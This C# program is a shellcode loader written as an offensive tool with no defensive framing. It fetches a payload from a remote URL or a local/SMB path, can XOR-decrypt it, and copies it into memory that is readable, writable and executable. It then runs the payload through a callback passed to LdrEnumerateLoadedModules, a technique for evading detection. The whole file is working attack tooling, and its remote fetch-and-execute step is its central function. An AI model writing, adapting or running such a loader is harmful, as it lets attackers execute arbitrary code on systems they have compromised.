using System;
using System.Runtime.InteropServices;
using System.Net.Http;
using System.IO;

class Program
{
    const uint MEM_COMMIT = 0x1000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    [StructLayout(LayoutKind.Sequential)]
    struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct LDR_DATA_TABLE_ENTRY
    {
        public IntPtr InLoadOrderLinks;
        public IntPtr InMemoryOrderLinks;
        public IntPtr InInitializationOrderLinks;
        public IntPtr DllBase;
        public IntPtr EntryPoint;
        public uint SizeOfImage;
        public UNICODE_STRING FullDllName;
        public UNICODE_STRING BaseDllName;
        public uint Flags;
        public ushort LoadCount;
        public ushort TlsIndex;
        public IntPtr Reserved1;
        public IntPtr Reserved2;
        public IntPtr LoadedImports;
        public IntPtr EntryPointActivationContext;
        public IntPtr PatchInformation;
    }

    delegate void LDR_ENUM_CALLBACK(ref LDR_DATA_TABLE_ENTRY ModuleInformation, IntPtr Parameter, out bool Stop);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int RtlMoveMemory(IntPtr dest, byte[] src, uint size);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int LdrEnumerateLoadedModules(uint ReservedFlag, LDR_ENUM_CALLBACK EnumProc, IntPtr context);

    static void Main(string[] args)
    {
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: Program.exe [-r remote_url | local_path_or_SMB_path] [-k xor_key]");
            return;
        }

        string sourcePath = args[1];
        string xorKey = null;

        if (args.Length == 4 && args[2] == "-k")
        {
            xorKey = args[3];
        }

        byte[] shellcode;

        if (args[0] == "-r")
        {
            Console.WriteLine("[Info] Attempting to download shellcode from the provided URL.");
            shellcode = DownloadShellcodeFromUrl(sourcePath);
        }
        else
        {
            Console.WriteLine("[Info] Attempting to read shellcode from the provided file path.");
            shellcode = File.ReadAllBytes(sourcePath);
        }

        if (!string.IsNullOrEmpty(xorKey))
        {
            Console.WriteLine("[Info] Decrypting shellcode using the provided XOR key.");
            shellcode = DecryptShellcode(shellcode, xorKey);
        }

        if (shellcode == null || shellcode.Length == 0)
        {
            Console.WriteLine("[Failed] Failed to load or decrypt shellcode.");
            return;
        }
        else
        {
            Console.WriteLine("[Success] Shellcode loaded/decrypted successfully.");
        }

        IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if (hAlloc == IntPtr.Zero)
        {
            Console.WriteLine($"[Failed] Memory allocation for shellcode failed. Error Code: {Marshal.GetLastWin32Error()}");
            return;
        }

        RtlMoveMemory(hAlloc, shellcode, (uint)shellcode.Length);

        LDR_ENUM_CALLBACK callback = (ref LDR_DATA_TABLE_ENTRY ModuleInformation, IntPtr Parameter, out bool Stop) =>
        {
            // Cast shellcode address to delegate and invoke
            var shellcodeDelegate = Marshal.GetDelegateForFunctionPointer<ShellcodeDelegate>(hAlloc);
            shellcodeDelegate();
            Stop = true;  // Stop the enumeration
        };

        LdrEnumerateLoadedModules(0, callback, IntPtr.Zero);
    }

    static byte[] DownloadShellcodeFromUrl(string url)
    {
        using (var httpClient = new HttpClient())
        {
            try
            {
                var byteArray = httpClient.GetByteArrayAsync(url).Result;
                if (byteArray != null && byteArray.Length > 0)
                {
                    Console.WriteLine("[Success] Shellcode downloaded successfully.");
                    return byteArray;
                }
                else
                {
                    Console.WriteLine("[Failed] Shellcode downloaded but the content is empty or null.");
                    return null;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Failed] Downloading shellcode: {ex.Message}");
                return null;
            }
        }
    }

    static byte[] DecryptShellcode(byte[] encryptedShellcode, string xorKey)
    {
        byte[] decryptedShellcode = new byte[encryptedShellcode.Length];
        for (int i = 0; i < encryptedShellcode.Length; i++)
        {
            decryptedShellcode[i] = (byte)(encryptedShellcode[i] ^ xorKey[i % xorKey.Length]);
        }
        return decryptedShellcode;
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate void ShellcodeDelegate();
}
